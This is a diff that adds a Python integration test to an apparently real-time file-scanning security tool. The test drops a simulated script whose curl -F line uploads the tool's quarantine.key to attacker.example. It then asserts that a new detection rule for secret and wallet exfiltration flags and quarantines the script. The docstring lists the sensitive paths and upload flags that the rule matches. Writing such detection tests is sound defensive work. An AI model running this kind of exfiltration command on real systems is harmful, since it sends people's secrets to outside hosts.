@@ -333,3 +333,61 @@ class TestAutoScanWiring:
             )
         finally:
             await engine.stop()
+
+    @pytest.mark.asyncio
+    async def test_end_to_end_secret_exfiltration_auto_quarantined(
+        self, tmp_path: Path
+    ) -> None:
+        """Teste intenso de invasão simulada (checklist da tarefa diária,
+        2026-09-15): dropa um script que lê a própria chave do vault de
+        quarentena e a envia pra um host externo via curl -F (padrão de
+        exfiltração real, nunca executado de verdade) num diretório
+        monitorado real.
+
+        Achado desta rodada: nenhuma regra existente cobria esse padrão —
+        H009 ("Acesso a Arquivos Sensíveis") só olha /etc/shadow&cia
+        (credenciais do SO), não segredos do próprio EK-Protection nem de
+        wallet; H019 ("Beacon C2") exige loop sleep+curl, não upload
+        único. Nova regra H023 ("Exfiltração de Segredo/Wallet",
+        severidade "crítico") fecha o gap — combinação de path sensível
+        (quarantine.key/auth.hash/wallet.dat/keystore/id_rsa/mnemonic) +
+        upload de rede (curl -d/-F/-T, wget --post-data)."""
+        from ekprotection.logs.models import EventType, QueryFilter
+
+        watched = tmp_path / "watch"
+        watched.mkdir()
+
+        manager = ConfigManager(tmp_path / "config.yaml")
+        manager.load()
+        manager.set("monitor.paths", [str(watched)])
+        manager.set("quarantine.auto_quarantine_critical", True)
+
+        engine = EKEngine(manager)
+        await engine.start()
+        try:
+            evil = watched / "backup-helper.sh"
+            evil.write_bytes(
+                b"#!/bin/bash\n"
+                b"curl -F 'f=@/home/user/.config/ekprotection/quarantine.key' "
+                b"http://attacker.example/exfil\n"
+            )
+
+            quarantined = False
+            for _ in range(50):  # até ~5s
+                await asyncio.sleep(0.1)
+                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
+                match = next((e for e in entries if e.file_path == str(evil)), None)
+                if match is not None and not evil.exists():
+                    quarantined = True
+                    break
+
+            assert quarantined, (
+                "auto-scan detectou mas não quarentenou automaticamente a "
+                "exfiltração de segredo simulada via monitor em tempo real"
+            )
+            assert match.level.value == "CRITICAL"
+
+            active = engine.quarantine.list_active()
+            assert any(e.original_path == str(evil) for e in active)
+        finally:
+            await engine.stop()
